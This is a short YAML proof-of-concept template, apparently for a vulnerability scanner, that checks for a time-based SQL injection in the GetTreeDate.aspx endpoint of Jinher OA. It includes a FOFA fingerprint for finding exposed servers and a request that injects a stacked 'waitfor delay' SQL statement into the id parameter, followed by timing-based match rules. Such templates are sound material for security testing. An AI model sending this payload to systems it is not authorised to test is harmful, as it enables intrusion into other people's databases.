id: poc-yaml-jinher-jhsoft-gettreedate-aspx-sqli
info:
  name: 金和OA GetTreeDate.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(2,5)
  t2: t1 + 2
requests:
- method: GET
  path: /c6/JHSoft.Web.Departments/GetTreeDate.aspx/?id=1;waitfor+delay%270:0:{{.t1}}%27--
  expression: 'status_code == 200 &&

    contains(body,"\"permissions\":") &&

    contains(body,"\"hasChildren\":") &&

    !contains(body,"<") &&

    contains(content_type,"application/json") &&

    duration >= t1 &&

    duration <= t2

    '
transport: http
